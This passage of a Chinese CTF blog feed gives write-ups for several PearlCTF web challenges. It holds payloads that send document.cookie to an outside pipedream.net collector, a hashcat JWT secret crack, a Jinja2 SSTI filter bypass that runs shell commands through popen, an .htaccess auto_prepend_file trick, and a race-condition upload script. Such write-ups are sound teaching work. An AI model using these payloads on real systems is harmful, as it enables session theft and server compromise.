class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">SERVER_HOST = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">SERVER_PORT = <span class="string">&quot;5001&quot;</span></span><br><span class="line">SERVER_TYPE = <span class="string">&quot;tcp&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Server Running...&quot;</span>)</span><br><span class="line">server, err := net.Listen(SERVER_TYPE, SERVER_HOST+<span class="string">&quot;:&quot;</span>+SERVER_PORT)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error listening:&quot;</span>, err.Error())</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> server.Close()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on &quot;</span> + SERVER_HOST + <span class="string">&quot;:&quot;</span> + SERVER_PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">connection, err := server.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error accepting: &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> processClient(connection)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processClient</span><span class="params">(connection net.Conn)</span></span> &#123;</span><br><span class="line">buffer := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">mLen, err := connection.Read(buffer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading:&quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">raw_http_req := strings.Split(<span class="type">string</span>(buffer[:mLen]), <span class="string">&quot;\r\n&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">splitted_req := strings.Split(raw_http_req, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> splitted_req[<span class="number">0</span>] != <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 405 Method Not Allowed\r\n\r\nCan only GET&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">parsed, err := url.Parse(splitted_req[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error parsing: &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">path := parsed.Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> path != <span class="string">&quot;/resp&quot;</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 404 Not Found\r\n\r\nNot Found&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">args, err := url.ParseQuery(parsed.RawQuery)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 500 Internal Server Error\r\n\r\nError&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, ok := args[<span class="string">&quot;body&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(body[<span class="number">0</span>]))</span><br><span class="line">connection.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据你的body来分割内容，先检查前面部分有没有问题，最后把最后一部分分割出来回显到网页上， 最后回显的部分没有任何过滤，先尝试一下直接打</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?body=HTTP%2F1.1%20200%20OK%0D%0A%0D%0A&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗，接下来简单构造一下外带cookie就行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?body=HTTP%2F1.1 200 OK%0D%0A%0D%0A&lt;script&gt;document.location.href=&quot;https://eopv4zbo4fy4ld3.m.pipedream.net/?x=&quot;%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>拿到token</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjI1MDYyfQ.ucZOtlvfIFuRlGecK_0a22w5OC1lvT3himWAqgXrbS0</span><br></pre></td></tr></table></figure><p>直接jwt.io改还不行，还要找到<code>SECRET</code>的key改才行</p><p>用hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjI1MDYyfQ.ucZOtlvfIFuRlGecK_0a22w5OC1lvT3himWAqgXrbS0</span><br></pre></td></tr></table></figure><p>爆破出来密钥是 … <code>banana</code> </p><p>最后在jwt.io上加上密钥后修改</p><p>放到&#x2F;flag检查得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;c4nt_s3nd_th3_resP0n53_w1th0ut_Sani7iz1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="I-am-a-web-noob-75-Solves-50-Points"><a href="#I-am-a-web-noob-75-Solves-50-Points" class="headerlink" title="I am a web-noob(75 Solves&#x2F;50 Points)"></a><strong>I am a web-noob</strong>(75 Solves&#x2F;50 Points)</h2><p><a href="https://noob-login.ctf.pearlctf.in/">https://noob-login.ctf.pearlctf.in/</a></p><p>给的是一个公共靶机没有给源码，给了一个输入用户名的地方,随便数一个用户名(123)，在主页回显</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Basic 123</span><br><span class="line">Blah blah blah</span><br></pre></td></tr></table></figure><p>猜测是ssti传一个参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set config=None%&#125;&#123;% set self=None%&#125; 7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现连续的两个大括号被过滤掉了，随便找个不用两个大括号的payload一把梭看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;%print(&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure><p>可以看到有回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set config=None%&#125;&#123;% set self=None%&#125;&#123;%print(&quot;&quot;.__ __.__bases__[0]. __sub es__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure><p>挺多东西被过滤了，那我们用另一种思路，用<code>request.values.a</code>，在原本里面加个找个然后在传一个a里面是被过滤的内容就可以绕过了，尝试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;%print%20(lipsum|attr(request.values.a))%&#125;&amp;a=__globals__</span><br></pre></td></tr></table></figure><p>成功回显</p><p>在回显里找到有os模块，用get获取，接下来就是如果有过滤就用<code>request.values.a</code>绕，或者用引号绕，最终payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?user=&#123;%print%20(lipsum|attr(request.values.a)).get(&#x27;o&#x27;&#x27;s&#x27;)|attr(%22pop%22%22en%22)(%22cat /app/flag.txt%22)|attr(%22read%22)()%&#125;%&#125;</span><br><span class="line">&amp;a=__globals__</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;W4s_my_p4ge_s3cur3_en0ugh_f0r_y0u?&#125;</span><br></pre></td></tr></table></figure><h2 id="rabbithole-58-Solves-94-points"><a href="#rabbithole-58-Solves-94-points" class="headerlink" title="rabbithole(58 Solves&#x2F;94 points)"></a><strong>rabbithole</strong>(58 Solves&#x2F;94 points)</h2><p><a href="https://rabbithole.ctf.pearlctf.in/">https://rabbithole.ctf.pearlctf.in</a></p><p>给了一个网页，里面什么也没有，dirmap扫一下，扫出来robots.txt访问一下</p><p>里面有个<code>/w0rk_h4rd</code>要我们去访问，里面说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You sure are hardworking</span><br><span class="line"></span><br><span class="line">but are you privileged enough?</span><br><span class="line"></span><br><span class="line">Here is what you want: s3cr3t1v3_m3th0d</span><br></pre></td></tr></table></figure><p>第二个问我们有没有权限，我们可以看到我们的Cookie是guest，把他改成admin就行了，下面看到文字有m3th0d，method就是访问方法，还有一个加粗的hardworking，先不知道是什么，先用方法和权限访问一下回显405，方法不对，那应该不是这个页面，试试<code>/hardworking</code>，访问后成功回显flag，这题也算是纯纯靠猜的脑洞题了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;c0ngr4t5_but_th1s_1s_just_th3_b3g1nn1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="learn-HTTP-better-15-Solves-476-Points"><a href="#learn-HTTP-better-15-Solves-476-Points" class="headerlink" title="learn HTTP better(15 Solves&#x2F;476 Points)"></a><strong>learn HTTP better</strong>(15 Solves&#x2F;476 Points)</h2><p><a href="https://v1-learn-http.ctf.pearlctf.in/">https://v1-learn-http.ctf.pearlctf.in/</a></p><p>是前面那题的升级版，和前面那题一样是xss，给了源码，js文件没什么改变，主要看go的源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">SERVER_HOST = <span class="string">&quot;localhost&quot;</span></span><br><span class="line">SERVER_PORT = <span class="string">&quot;5001&quot;</span></span><br><span class="line">SERVER_TYPE = <span class="string">&quot;tcp&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Server Running...&quot;</span>)</span><br><span class="line">server, err := net.Listen(SERVER_TYPE, SERVER_HOST+<span class="string">&quot;:&quot;</span>+SERVER_PORT)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error listening:&quot;</span>, err.Error())</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> server.Close()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on &quot;</span> + SERVER_HOST + <span class="string">&quot;:&quot;</span> + SERVER_PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">connection, err := server.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error accepting: &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> processClient(connection)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processClient</span><span class="params">(connection net.Conn)</span></span> &#123;</span><br><span class="line">buffer := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">mLen, err := connection.Read(buffer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading:&quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">raw_http_req := strings.Split(<span class="type">string</span>(buffer[:mLen]), <span class="string">&quot;\r\n&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">splitted_req := strings.Split(raw_http_req, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> splitted_req[<span class="number">0</span>] != <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 405 Method Not Allowed\r\n\r\nCan only GET&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">parsed, err := url.Parse(splitted_req[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error parsing: &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">path := parsed.Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> path != <span class="string">&quot;/resp&quot;</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 404 Not Found\r\n\r\nNot Found&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">args, err := url.ParseQuery(parsed.RawQuery)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 500 Internal Server Error\r\n\r\nError&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body, ok := args[<span class="string">&quot;body&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;</span>))</span><br><span class="line">connection.Close()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">splitted_resp := strings.Split(body[<span class="number">0</span>], <span class="string">&quot;\r\n\r\n&quot;</span>)</span><br><span class="line">new_header := strings.Join([]<span class="type">string</span>&#123;splitted_resp[<span class="number">0</span>], <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;&quot;</span>&#125;, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">final_body := strings.Join([]<span class="type">string</span>&#123;new_header, splitted_resp[<span class="number">1</span>]&#125;, <span class="string">&quot;\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">_, err = connection.Write([]<span class="type">byte</span>(final_body))</span><br><span class="line">connection.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了一个</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_header := strings.Join([]<span class="type">string</span>&#123;splitted_resp[<span class="number">0</span>], <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;&quot;</span>&#125;, <span class="string">&quot;\r\n&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><code>script-src</code> 是一个指令，用于控制特定页面的一组与脚本相关的权限，定义此策略后，当浏览器从任何其他来源加载脚本时，只会抛出错误消息。即使恶意攻击者成功的代码注入到 Web 站点时，也只能遇到错误消息</p></blockquote><p>既然是self我们只需要把他定向到自己就可以了</p><p>那么我们构造出来脚本就为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/resp?body=HTTP%252F1.1%2520200%2520OK%250D%250A%250D%250Aalert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功弹窗，最后构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP%2F1.1 200 OK%0D%0A%0D%0A&lt;script src=&quot;/resp?body=HTTP%252F1.1%2520200%2520OK%250D%250A%250D%250Adocument.location.href=%27https://eopv4zbo4fy4ld3.m.pipedream.net/?%27%252Bdocument.cookie&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>反弹回cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzEwMjMxMTI1fQ._ej8la2uH7bscSM0WGhbtAt906crQ1OORF4zUtp9moo</span><br></pre></td></tr></table></figure><p>继续用hashcat看一下密钥是password</p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;w0w_7hat_w4s_0ut_Of_th3_boX&#125;</span><br></pre></td></tr></table></figure><h2 id="Uploader-5-Solves-499-Points"><a href="#Uploader-5-Solves-499-Points" class="headerlink" title="Uploader(5 Solves&#x2F;499 Points)"></a><strong>Uploader</strong>(5 Solves&#x2F;499 Points)</h2><p>进去之后是一个upload界面，里面似乎只过滤文件内容，对文件名并不过滤，但是会对文件名进行hash</p><p>这个的后端过滤很奇怪，<code>&lt;&gt;[]()=</code>等字符似乎可以存在，但是，只要左右超过有两个字符就会被过滤，同时php也被过滤了，中间思考过程就不说了，说了就太长了，和一个师傅讨论了快两个小时才出，直接给出正确的思考答案</p><p>首先先上传<code>.htaccess</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ph\</span><br><span class="line">p_flag engine 1</span><br><span class="line">ph\</span><br><span class="line">p_value auto_prepend_file .ph\</span><br><span class="line">p</span><br></pre></td></tr></table></figure><p>是的！我们整了半天，发现是php的解析没开，当时也完全没有想到，而斜杠则是绕过php的过滤</p><p>而php则是简单的条件竞争就能传上去并解析，虽然还是会删除，但是传一个写木马上去解析就行，最后找到flag在<code>/opt/flag.txt</code>(也算是逆天这么能藏，加了.txt find也find不到，附上别的师傅的吐槽)</p><p><img src="/./tucao.png"></p><p>最后附上竞争代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getphpinfo</span>():</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://uploader-be0b0177dfa5950d.ctf.pearlctf.in&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;uploader-be0b0177dfa5950d.ctf.pearlctf.in&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------72940437516480145501393954295&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://uploader-be0b0177dfa5950d.ctf.pearlctf.in&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://uploader-be0b0177dfa5950d.ctf.pearlctf.in/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        res= requests.get(<span class="string">&quot;https://uploader-be0b0177dfa5950d.ctf.pearlctf.in/uploads/10.80.1.9/.php&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    thread = threading.Thread(target=getphpinfo)</span><br><span class="line">    threads.append(thread)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pearl&#123;d1d_y0u_just_d0uble_r4ce?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从国赛想到的一些php绕过注释符trick</title>
      <link href="/2024/07/14/%E4%BB%8E%E5%9B%BD%E8%B5%9B%E6%83%B3%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9Bphp%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6trick/"/>
      <url>/2024/07/14/%E4%BB%8E%E5%9B%BD%E8%B5%9B%E6%83%B3%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9Bphp%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6trick/</url>
      
